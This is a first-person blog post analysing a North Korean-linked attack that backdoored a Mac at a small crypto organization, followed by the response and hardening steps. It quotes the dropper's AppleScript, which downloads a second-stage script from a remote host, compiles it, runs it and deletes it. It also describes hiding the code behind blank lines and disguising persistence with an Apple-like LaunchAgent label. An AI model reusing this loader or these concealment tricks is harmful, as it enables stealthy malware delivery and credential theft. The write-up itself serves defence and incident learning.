---
title: "The meeting was real, the update wasn't: a North Korean backdoor on a Mac"
description: "Over five weeks, a North Korean group tried three times to get into a small crypto team I looked after. The third try put a backdoor on a Mac for about four hours. How it got in, what we treated as stolen, what changed afterwards, and what I still can't prove."
date: 2026-11-20 09:00:00 +0100
slug: dprk-backdoor-on-a-mac
topic: Security
feed: false
---

## Three tries in five weeks

I looked after IT and security for a small crypto organization. Over five weeks, someone tried three times to get into it. The attempts match what has been published about BlueNoroff, the part of North Korea's Lazarus operation that steals from crypto companies. The malware from the last one carries the name of a loader that researchers tie to that group.

- **The first try:** an email that looked like it came from a large crypto exchange, asking for a "token supply schedule". The attached spreadsheet was a compiled AppleScript named `…xlsx.scpt`. Finder hides file extensions by default, so it showed up as `.xlsx`. On the Mac I checked, it had been downloaded but never run.
- **The second:** an email from a lookalike domain, posing as a real executive at an investment firm. It asked about our exchange listings and how our custody and multisig approvals were set up. Nobody acted on it.
- **The third:** a meeting link on Telegram. This one worked.

## How the third one got in

A colleague got a message on Telegram from someone they knew. That person's account had been hijacked. The message held a meeting link on a domain made to look like Microsoft Teams.

The page asked for a "Teams SDK update" and downloaded it: an AppleScript file. My colleague downloaded it twice. Within minutes they were in a genuine Teams meeting and then a Google Meet, where deepfaked people on camera kept them talking and pushed the update.

The meetings were real. The malware never came through them. It came as a separate file, framed as the thing you need to join.

The script opens with a fake Microsoft banner that says to click Run to update. Below it are hundreds of blank lines, which push the real code out of view in Script Editor. Then four lines:

```applescript
set scriptFile to do shell script "mktemp -t tmp.XXXXXX.scpt"
do shell script "curl -k -L -S -s -f '<redacted>' | osacompile -o " & scriptFile & " -"
run (load script (POSIX file scriptFile))
do shell script "rm " & scriptFile
```

It downloads a second script, compiles it, runs it and deletes it. Almost nothing touches the disk.

That second stage installed a backdoor: a small Rust program with no developer identity in its signature, started by a LaunchAgent with a label that looks like an Apple password component. The agent starts at login, restarts if it's killed and sends its output nowhere. Its server address is encrypted inside the binary. The Mac rebooted during the attack, and the agent started again.

From the first download to the Mac going offline was about four hours.

## The first hours

- **Telegram first.** We ended every other session on my colleague's Telegram account. A hijacked account can message the rest of the team, and that's how this attack spreads.
- **Offline, not wiped.** The Mac came off the network. My read-only triage script ran on it, and we kept the results.
- **Read the artifact.** I decompiled the dropper, found where it fetched the second stage from, fingerprinted the backdoor and rebuilt the timeline from browser history and download records.

## Assume it's stolen

This was the hard call. I couldn't prove that anything had left the machine. The system log came back empty, the second stage had deleted itself, and the backdoor's settings were encrypted.

But a backdoor in that folder can't exist unless the payload ran, and it had hours. So we acted as if everything on that Mac had been taken: browser sessions and cookies, saved browser passwords, the login keychain and the Telegram session.

Five weeks earlier, on the first attempt, I had made the opposite mistake. My triage script flagged a LaunchAgent belonging to Steam as malware, and I called it a confirmed compromise before I read the file. This time I escalated on the file, not on the label.

What "assume stolen" meant in practice:

- **Exchanges:** we signed out every session and audited the API keys. On one exchange we reviewed the withdrawal allowlist. On the other we locked the account settings so they can't be changed.
- **A browser wallet:** it was a test wallet with no funds in it. Its recovery phrase is treated as burned, so it will never be reused or sent money.
- **The password manager** wasn't unlocked during those hours, so rotating what's in it was a precaution, not an emergency.
- **What wasn't there:** no SSH keys, cloud credentials or developer tokens lived on that Mac, which kept the list short.

One thing about order. The exchanges and the password manager all recover through the email account. Until that account is locked down, whoever controls the mailbox can undo the exchange resets. Lock the email account first.

## What changed afterwards

- **One rule for the team:** no real meeting ever needs you to run a script to join. If someone asks you to, stop, and check with them on a number you already have, not in the chat that asked.
- **If you already clicked:** turn off Wi-Fi but leave the machine on, report it from your phone, and end your other Telegram sessions from that phone.
- **The triage script** now checks for the files, domains and persistence this campaign used.
- **The finance mailing list.** It accepts mail from anyone, because banks, vendors and colleagues outside the group write to it. Blocking outsiders would break it. Instead, mail that Google flags as spam is now held for review, only admins can add outside members, and two old members were removed.
- **A mail monitor** for that list, which I've designed. It would check for new mail every 60 seconds. Fixed rules run first: a new sender, a lookalike domain, an invoice from a free-mail address, a request to install something to join a call. Only flagged mail goes to a language model, which runs with no tools and returns a verdict. A timeout or a broken answer counts as suspicious. The email is data the model reads, and a malicious one has nothing to make it do.

## What I still can't prove

- **The system log is empty.** The collection ran without admin rights, and the log query returned nothing. There's no OS-level record of the second stage running or of data leaving.
- **App permissions are unknown.** Terminal didn't have Full Disk Access, so I couldn't read the privacy database and can't rule out changes to it.
- **The second stage is gone.** Only what it installed survives.
- **The backdoor's servers are unknown.** Its settings are encrypted. Getting them means running it in an isolated virtual machine and watching where it calls.

So "stolen" is an assumption backed by capability and time, not proven credential by credential. Every claim in my report carries a confidence level for that reason.

## If you look after a small crypto team

- Turn on "Show all filename extensions" in Finder, on every Mac. It defeats the whole `.xlsx.scpt` trick.
- Look for LaunchAgents in users' Library folders with `com.apple.` labels. Apple's own components don't live there.
- Verify payments and approvals by voice, on a number you already have.
- Treat a surprise meeting link from a friend as a question to ask them out of band, not an invitation.
